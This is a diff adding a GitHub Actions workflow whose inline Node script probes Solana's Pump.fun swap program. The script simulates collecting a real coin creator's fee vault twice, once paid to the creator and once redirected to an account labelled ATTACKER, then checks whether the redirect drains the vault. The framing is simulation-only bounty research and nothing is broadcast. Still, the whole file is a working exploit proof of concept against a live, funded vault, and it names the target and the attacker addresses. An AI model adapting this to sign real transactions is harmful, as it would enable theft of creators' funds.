@@ -1,0 +1,120 @@
+name: mayhem-collect-creator-redirect-runtime-v2
+on:
+  push:
+    paths:
+      - '.github/workflows/mayhem-collect-creator-redirect-runtime-v2.yml'
+  workflow_dispatch:
+permissions:
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 10
+    steps:
+      - uses: actions/setup-node@v4
+        with: {node-version: 24}
+      - run: npm install --no-save @pump-fun/pump-swap-sdk@1.19.0 @solana/web3.js @solana/spl-token
+      - name: Simulation-only positive-vault destination binding differential
+        shell: bash
+        run: |
+          node --input-type=module <<'NODE'
+          import {Connection,PublicKey,TransactionMessage,VersionedTransaction} from '@solana/web3.js';
+          import {
+            AccountLayout,
+            ASSOCIATED_TOKEN_PROGRAM_ID,
+            createAssociatedTokenAccountIdempotentInstruction,
+            getAssociatedTokenAddressSync,
+          } from '@solana/spl-token';
+          import {getPumpAmmProgram,coinCreatorVaultAuthorityPda,coinCreatorVaultAtaPda} from '@pump-fun/pump-swap-sdk';
+
+          const RPC='https://api.mainnet-beta.solana.com';
+          const connection=new Connection(RPC,'confirmed');
+          const program=getPumpAmmProgram(connection);
+
+          // Read-only scan identified this currently positive, non-migrated Mayhem creator vault.
+          // No transaction is broadcast anywhere in this workflow.
+          const CONTEXT_POOL=new PublicKey('2AZvfjn3Hre5mM47bRv6VnKRX36wSDW6vrkC5ykK3X7T');
+          const QUOTE_MINT=new PublicKey('So11111111111111111111111111111111111111112');
+          const TOKEN_PROGRAM=new PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');
+          const COIN_CREATOR=new PublicKey('GZd3BGEAeNiU7Av14FVCctyaMJkBCk9U6RBMUxuGYQYz');
+          const ATTACKER=new PublicKey('Gygj9QQby4j2jryqyqBHvLP7ctv2SaANgh4sCb69BUpA');
+          const vaultAuthority=coinCreatorVaultAuthorityPda(COIN_CREATOR);
+          const vaultAta=coinCreatorVaultAtaPda(vaultAuthority,QUOTE_MINT,TOKEN_PROGRAM);
+          const creatorAta=getAssociatedTokenAddressSync(QUOTE_MINT,COIN_CREATOR,true,TOKEN_PROGRAM,ASSOCIATED_TOKEN_PROGRAM_ID);
+          const attackerAta=getAssociatedTokenAddressSync(QUOTE_MINT,ATTACKER,true,TOKEN_PROGRAM,ASSOCIATED_TOKEN_PROGRAM_ID);
+
+          function amountFromAccountInfo(ai){
+            if(!ai?.data || ai.data.length<165)return null;
+            try{return AccountLayout.decode(ai.data).amount.toString()}catch{return null}
+          }
+          function amountFromSimAccount(a){
+            if(!a?.data?.[0])return null;
+            try{const b=Buffer.from(a.data[0],'base64');if(b.length<165)return null;return AccountLayout.decode(b).amount.toString()}catch{return null}
+          }
+          const preInfos=await connection.getMultipleAccountsInfo([vaultAta,creatorAta,attackerAta],'confirmed');
+          const pre={vault:amountFromAccountInfo(preInfos[0]),creator:amountFromAccountInfo(preInfos[1]),attacker:amountFromAccountInfo(preInfos[2])};
+          console.log('CONTEXT',JSON.stringify({
+            contextPool:CONTEXT_POOL.toBase58(),quoteMint:QUOTE_MINT.toBase58(),tokenProgram:TOKEN_PROGRAM.toBase58(),coinCreator:COIN_CREATOR.toBase58(),attacker:ATTACKER.toBase58(),
+            vaultAuthority:vaultAuthority.toBase58(),vaultAta:vaultAta.toBase58(),creatorAta:creatorAta.toBase58(),attackerAta:attackerAta.toBase58(),
+            preExists:{vault:!!preInfos[0],creatorAta:!!preInfos[1],attackerAta:!!preInfos[2]},pre
+          },null,2));
+          if(!preInfos[0] || BigInt(pre.vault??'0')===0n)throw Error('target creator vault is no longer positive');
+
+          async function collectIx(destination){
+            return await program.methods.collectCoinCreatorFee().accountsPartial({
+              quoteMint:QUOTE_MINT,
+              quoteTokenProgram:TOKEN_PROGRAM,
+              coinCreator:COIN_CREATOR,
+              coinCreatorTokenAccount:destination,
+            }).instruction();
+          }
+          const controlCollect=await collectIx(creatorAta);
+          const redirectCollect=await collectIx(attackerAta);
+          console.log('CONTROL_IX_KEYS',JSON.stringify(controlCollect.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
+          console.log('REDIRECT_IX_KEYS',JSON.stringify(redirectCollect.keys.map((k,i)=>({i,pk:k.pubkey.toBase58(),s:k.isSigner,w:k.isWritable})),null,2));
+
+          function ataCreate(owner,ata){
+            return createAssociatedTokenAccountIdempotentInstruction(ATTACKER,ata,owner,QUOTE_MINT,TOKEN_PROGRAM,ASSOCIATED_TOKEN_PROGRAM_ID);
+          }
+          function parse(logs){
+            const t=(logs??[]).join('\n');
+            return {
+              account:t.match(/AnchorError caused by account: ([A-Za-z0-9_\-]+)/)?.[1]??null,
+              code:t.match(/Error Code: ([A-Za-z0-9_]+)/)?.[1]??null,
+              num:Number(t.match(/Error Number: (\d+)/)?.[1]??0)||null,
+              interesting:(logs??[]).filter(x=>/Instruction:|AnchorError|Error Code|Error Number|Left:|Right:|TransferChecked|Transfer|Collect|creator|failed|success/i.test(x)).slice(-120),
+            };
+          }
+          async function simulate(label,instructions){
+            const {blockhash}=await connection.getLatestBlockhash('processed');
+            const tx=new VersionedTransaction(new TransactionMessage({payerKey:ATTACKER,recentBlockhash:blockhash,instructions}).compileToV0Message());
+            const raw=Buffer.from(tx.serialize()).toString('base64');
+            const addresses=[vaultAta,creatorAta,attackerAta];
+            const body={jsonrpc:'2.0',id:1,method:'simulateTransaction',params:[raw,{encoding:'base64',sigVerify:false,replaceRecentBlockhash:true,commitment:'processed',accounts:{encoding:'base64',addresses:addresses.map(x=>x.toBase58())}}]};
+            const r=await fetch(RPC,{method:'POST',headers:{'content-type':'application/json','user-agent':'pump-authorized-bounty-simulation-only-positive-creator-redirect/1.0'},body:JSON.stringify(body)});
+            const j=await r.json();if(j.error)throw Error(JSON.stringify(j.error));
+            const v=j.result.value,e=parse(v.logs);const post={};
+            for(let i=0;i<addresses.length;i++)post[['vault','creator','attacker'][i]]=amountFromSimAccount(v.accounts?.[i]);
+            const delta={};for(const k of ['vault','creator','attacker']){if(pre[k]!=null&&post[k]!=null)delta[k]=(BigInt(post[k])-BigInt(pre[k])).toString();else delta[k]=null}
+            console.log('\nSIM',label,JSON.stringify({err:v.err,units:v.unitsConsumed,account:e.account,code:e.code,num:e.num,pre,post,delta,interesting:e.interesting},null,2));
+            return {v,e,post,delta};
+          }
+
+          // Canonical control: anyone may pay to create the creator's ATA, then collect to the creator.
+          const controlIxs=[];
+          if(!preInfos[1])controlIxs.push(ataCreate(COIN_CREATOR,creatorAta));
+          controlIxs.push(controlCollect);
+          const control=await simulate('CONTROL_creator_destination',controlIxs);
+
+          // Decisive differential: same source vault, same coinCreator, but destination is attacker-owned ATA.
+          const redirectIxs=[];
+          if(!preInfos[2])redirectIxs.push(ataCreate(ATTACKER,attackerAta));
+          redirectIxs.push(redirectCollect);
+          const redirect=await simulate('TEST_attacker_destination',redirectIxs);
+
+          // Summary deliberately uses only simulation results; nothing was signed or sent.
+          const sourceAmount=BigInt(pre.vault);
+          const controlMoved=control.v.err==null && control.delta.vault!=null && BigInt(control.delta.vault)===-sourceAmount && control.delta.creator!=null && BigInt(control.delta.creator)===sourceAmount;
+          const redirectMoved=redirect.v.err==null && redirect.delta.vault!=null && BigInt(redirect.delta.vault)===-sourceAmount && redirect.delta.attacker!=null && BigInt(redirect.delta.attacker)===sourceAmount;
+          console.log('FINAL_DIFFERENTIAL',JSON.stringify({sourceAmount:sourceAmount.toString(),controlSuccess:control.v.err==null,controlMoved,redirectSuccess:redirect.v.err==null,redirectMoved,redirectError:{account:redirect.e.account,code:redirect.e.code,num:redirect.e.num}},null,2));
+          NODE
